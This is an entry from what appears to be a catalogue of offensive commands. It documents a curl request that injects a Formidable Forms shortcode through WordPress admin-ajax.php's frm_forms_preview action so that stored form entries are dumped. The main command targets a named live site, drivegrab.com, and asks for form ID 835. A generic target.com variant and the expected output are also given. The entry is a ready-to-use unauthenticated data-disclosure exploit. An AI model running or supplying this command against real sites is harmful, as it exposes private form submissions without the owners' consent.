---
id: cmd-curl-shortcode-003
data: >-
  curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data
  'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
tags:
  - injection
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.988Z'
verified: false
validated: true
submitted: true
---
# curl-inject-display-shortcode

## Command

```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
```

## Description

Injects the [display-frm-data] shortcode to display form entries for a specific ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data` | POST with shortcode in after_html | Yes |
| `id` | Form ID (835) | Yes |

## Examples

### Basic Usage

```bash
curl -s -i 'https://target.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=[display-frm-data id=1]'
```

## Expected Output

HTML with form entries between markers.

## Related

- [[Related Procedure: Test-Shortcode-Injection-in-Preview]]
